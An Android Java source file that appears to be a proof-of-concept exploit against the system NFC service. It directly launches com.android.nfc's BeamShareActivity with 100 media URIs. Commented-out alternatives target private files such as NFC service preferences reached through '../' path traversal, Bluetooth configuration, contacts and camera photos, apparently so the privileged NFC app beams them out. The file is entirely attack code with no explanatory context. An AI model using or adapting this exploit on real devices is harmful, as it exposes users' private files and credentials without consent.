package ms509.com.testaospnfc;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    Button m_btnSend = null;
    Button m_btnSendm = null;
    //private final String PRIV_URI_STRING = "content://contacts/people";
    //private final String PRIV_URI_STRING = "file:///sdcard/../data/data/com.android.nfc/shared_prefs/NfcServicePrefs.xml";
    //private final String PRIV_URI_STRING = "file:///data/nfc/nfaStorage.bin1";
    //private final String PRIV_URI_STRING = "file:///sdcard/IMG_20170213_180342.jpg";
    //private final String PRIV_URI_STRING = "content://media/external/images/media/93";
   //private final static String PRIV_FILE_URI2 = "file:///data/misc/bluedroid/bt_config.conf";
    private final String PRIV_URI_STRING_BASE = "content://media/external/images/media/";
    //private final String PRIV_CONTACT= "content://contacts/people/1";
    //private static final String PRIV_URI_STRING = "content://com.android.bluetooth.opp/btopp/1";
    //private final String PRIV_URI_STRING = "file:///sdcard/DCIM/Camera";
    //private final String PRIV_URI_STRING = "file:///sdcard/btopp.db";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        m_btnSend = (Button)findViewById(R.id.send);

        m_btnSend.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
                ArrayList<Uri> uris = new ArrayList<Uri>();
                Uri uri = null;
                for(int i=0; i < 100; i++) {
                    uri = Uri.parse(PRIV_URI_STRING_BASE + Integer.toString(i));
                    uris.add(uri);
                }
                intent.putExtra(Intent.EXTRA_STREAM, uris);
                intent.setComponent(new ComponentName("com.android.nfc",
                        "com.android.nfc.BeamShareActivity"));
                startActivity(intent);
            }
        });

        /*
        m_btnSendm.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_SEND);
                Uri uri = Uri.parse(PRIV_FILE_URI2);
                intent.putExtra(Intent.EXTRA_STREAM, uri);
                intent.setComponent(new ComponentName("com.android.nfc",
                        "com.android.nfc.BeamShareActivity"));
                startActivity(intent);
            }
        });
        */
    }
}
